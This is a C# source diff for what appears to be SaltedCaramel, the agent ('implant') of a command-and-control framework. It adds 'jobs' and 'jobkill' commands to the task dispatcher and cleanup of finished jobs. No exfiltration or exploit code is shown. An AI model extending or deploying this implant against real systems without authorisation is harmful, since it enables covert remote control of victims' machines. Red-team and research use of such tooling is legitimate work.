@@ -1,6 +1,9 @@
-﻿using SaltedCaramel.Tasks;
+﻿using Newtonsoft.Json;
+using SaltedCaramel.Tasks;
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
+using System.Threading;
 
 namespace SaltedCaramel
 {
@@ -12,6 +15,7 @@ namespace SaltedCaramel
         public string command { get; set; }
         public string @params { get; set; }
         public string id { get; set; }
+        internal int shortId { get; set; }
 #if (DEBUG)
         public string status { get; set; }
         public string message { get; set; }
@@ -52,6 +56,16 @@ namespace SaltedCaramel
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to exit");
                 Exit.Execute(this, implant);
+            }
+            else if (this.command == "jobs")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to list jobs");
+                Jobs.Execute(this, implant);
+            }
+            else if (this.command == "jobkill")
+            {
+                Debug.WriteLine($"[-] DispatchTask - Tasked to kill job {this.@params}");
+                Jobs.Execute(this, implant);
             }
             else if (this.command == "kill")
             {
@@ -144,6 +158,14 @@ namespace SaltedCaramel
                 implant.SendComplete(this.id);
             }
             else if (this.status == "error") implant.SendError(this.id, this.message);
+
+            for (int i = 0; i < implant.jobs.Count; i++)
+            {
+                if (implant.jobs[i].shortId == this.shortId)
+                {
+                    implant.jobs.RemoveAt(i);
+                }
+            }
         }
     }
 }
